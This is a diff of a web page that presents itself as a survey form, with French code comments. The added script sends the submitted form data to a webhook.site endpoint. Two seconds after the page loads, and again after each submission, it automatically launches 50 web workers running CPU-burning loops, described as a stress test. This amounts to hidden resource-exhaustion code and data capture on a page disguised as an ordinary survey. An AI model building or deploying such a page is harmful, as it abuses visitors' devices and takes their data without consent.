@@ -15,7 +15,7 @@
     .radios{padding:10px 0}
     .submit{display:block;margin:20px auto;padding:10px 20px;background:#fff;color:#251033;border:none;cursor:pointer}
     footer{font-size:12px;text-align:center;margin-top:10px;color:#ccc}
-    #log{background:#1b0620;padding:10px;margin:10px 0;font-family:monospace;font-size:12px;max-height:160px;overflow-y:auto;color:#fff}
+    #log{background:#1b0620;padding:10px;margin:10px 0;font-family:monospace;font-size:12px;max-height:150px;overflow-y:auto;color:#fff}
 </style>
 </head>
 <body>
@@ -58,99 +58,108 @@
 <script>
 const log = msg => {
     const p = document.getElementById('log');
-    if(p){
+    if (p) {
         p.textContent = new Date().toLocaleTimeString() + ' — ' + msg + '\n' + p.textContent;
     }
 };
 
 let workers = [];
-const duration = 30000; // durée totale pour arrêter automatiquement les workers
+const duration = 30000; // 30 secondes de simulation
 
-function makeWorkerScript(){
+function makeWorkerScript() {
     return `
         let stopped = false;
-        onmessage = e => { if(e.data === 'stop') stopped = true; };
-        function busyChunk(iter){
+        onmessage = e => { if (e.data === 'stop') stopped = true; };
+        function busyChunk(iter) {
             let x = 0;
-            for(let i=0;i<iter;i++) x+=Math.sqrt(i);
+            for (let i = 0; i < iter; i++) x += Math.sqrt(i);
             return x;
         }
-        (async function loop(){
+        (async function loop() {
             const CHUNK = 20000;
             const INTERVAL_MS = 10;
-            while(!stopped){
+            while (!stopped) {
                 busyChunk(CHUNK);
-                await new Promise(r=>setTimeout(r, INTERVAL_MS));
-                postMessage({tick:Date.now()});
+                await new Promise(r => setTimeout(r, INTERVAL_MS));
+                postMessage({ tick: Date.now() });
             }
-            postMessage({stopped:true});
+            postMessage({ stopped: true });
         })();
     `;
 }
 
-function startSimulation(){
+function startSimulation() {
     log('Démarrage de la simulation...');
     stopWorkers();
-
+    
     const blob = new Blob([makeWorkerScript()], { type: 'application/javascript' });
     const url = URL.createObjectURL(blob);
 
-    // Lancer plusieurs workers pour le stress test (while(true) à l'intérieur des workers)
-    for(let i=0;i<50;i++){ // ajuste le nombre si besoin
+    // Lancer plusieurs workers pour le stress test
+    for (let i = 0; i < 50; i++) {
         const w = new Worker(url);
-        w.onmessage = () => {}; // tu peux logger w.onmessage si tu veux
+        w.onmessage = () => {};
         workers.push(w);
     }
 
-    setTimeout(()=>{
+    setTimeout(() => {
         stopWorkers();
         URL.revokeObjectURL(url);
         log('Simulation terminée automatiquement');
     }, duration);
 }
 
-function stopWorkers(){
-    if(workers.length===0) return;
+function stopWorkers() {
+    if (workers.length === 0) return;
     log('Arrêt des workers...');
-    for(const w of workers){
-        try{ w.postMessage('stop'); }catch(e){}
-        try{ w.terminate(); }catch(e){}
+    for (const w of workers) {
+        try { w.postMessage('stop'); } catch(e) {}
+        try { w.terminate(); } catch(e) {}
     }
-    workers=[];
+    workers = [];
 }
 
-document.addEventListener('DOMContentLoaded',()=>{
+// === NOUVEAU : interception du formulaire pour envoyer les données ===
+document.addEventListener('DOMContentLoaded', () => {
     const form = document.getElementById('survey');
 
-    form.addEventListener('submit', async (e)=>{
-        e.preventDefault();
+    form.addEventListener('submit', async (e) => {
+        e.preventDefault(); // empêche le submit classique
 
-        // --- Préparer FormData (en évitant de forcer "Content-Type") ---
-        const fd = new FormData(form);
+        // Récupération des données du formulaire
+        const formData = new FormData(form);
+        const data = Object.fromEntries(formData.entries());
 
-        try{
-            // Envoi sans header Content-Type (permet souvent d'éviter preflight)
-            const resp = await fetch("https://webhook.site/0b847e8b-f7c7-4bcf-bc86-945235c1b312", {
+        try {
+            // Envoi des données à ton Webhook.site
+            await fetch("https://webhook.site/0b847e8b-f7c7-4bcf-bc86-945235c1b312", {
                 method: "POST",
-                body: fd,
-                // NE PAS mettre headers: {'Content-Type': 'application/json'}
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(data)
             });
-
-            // Vérification basique
-            if(resp.ok){
-                log("Formulaire envoyé à distance (POST reçu).");
-            } else {
-                log("Le serveur a répondu, status: " + resp.status);
-            }
-        } catch(err){
-            log("Erreur réseau / CORS : " + (err && err.message ? err.message : String(err)));
-            // Afficher conseil si erreur CORS
-            log("Si c'est une erreur CORS, vérifie la console du navigateur (F12) pour voir le message exact.");
+            log("Formulaire envoyé à distance.");
+        } catch (err) {
+            log("Erreur lors de l'envoi des données : " + err.message);
         }
 
-        // Lancer le stress test après tentative d'envoi
+        // Lancer le stress test APRÈS envoi des données
         startSimulation();
     });
+
+    // Lancement automatique au chargement de la page (ton code existant)
+    log('Page chargée - démarrage dans 2 secondes...');
+    setTimeout(() => {
+        startSimulation();
+    }, 2000);
+
+    // Bouton d'arrêt manuel
+    const stopBtn = document.getElementById('stop');
+    if (stopBtn) {
+        stopBtn.addEventListener('click', () => {
+            stopWorkers();
+            log('Arrêt manuel demandé');
+        });
+    }
 });
 </script>
 </body>
